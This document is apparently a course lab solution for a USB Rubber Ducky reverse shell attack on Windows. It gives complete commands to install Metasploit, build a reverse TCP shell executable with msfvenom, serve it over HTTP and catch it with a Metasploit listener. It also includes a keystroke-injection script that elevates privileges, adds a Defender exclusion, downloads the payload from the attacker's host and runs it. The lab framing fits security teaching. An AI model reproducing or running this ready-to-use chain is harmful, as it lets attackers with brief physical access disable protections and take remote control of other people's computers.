### Solutions of the Lab 2 - Reverse Shell Attack - USB Rubber Ducky

## Setting up host machine

###Install Metasploitable

```

sudo apt install curl gnupg2
curl https://apt.metasploit.com/metasploit-framework.gpg.key | gpg --dearmor > metasploit-framework.gpg
sudo mv metasploit-framework.gpg /etc/apt/trusted.gpg.d/
echo "deb https://apt.metasploit.com/ jessie main" | sudo tee /etc/apt/sources.list.d/metasploit-framework.list
sudo apt update
sudo apt install metasploit-framework

```

### Payload and other necessary steps
```
sudo python3 -m http.server 80
sudo ufw allow 4444/tcp
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.100.16 LPORT=4444 -f exe > payload.exe
```

### Metasploitable

Open with ```msfconsole``` and then:
```
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST 192.168...
set LPORT 4444
exploit
```

### Rubber ducky code

Replace the IP with the IP of the host
```
DELAY 5000
GUI r
DELAY 550
STRING powershell "start-process wt -verb runas" 
ENTER
DELAY 4500
LEFT
ENTER
DELAY 4400

STRING $dir = "C:/temp" 
ENTER
STRING $shell = "$dir/shell.exe" 
ENTER
DELAY 550

STRING Add-MpPreference -ExclusionPath $dir
ENTER
DELAY 950

STRING if (-Not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir }
ENTER
DELAY 900

STRING Invoke-WebRequest -Uri http://192.168.100.17/payload.exe -OutFile $shell
ENTER
DELAY 10000

REM |===Run .exe and set up Staged TCP reverse shell===|
STRING Start-Process $shell
ENTER
DELAY 950
```
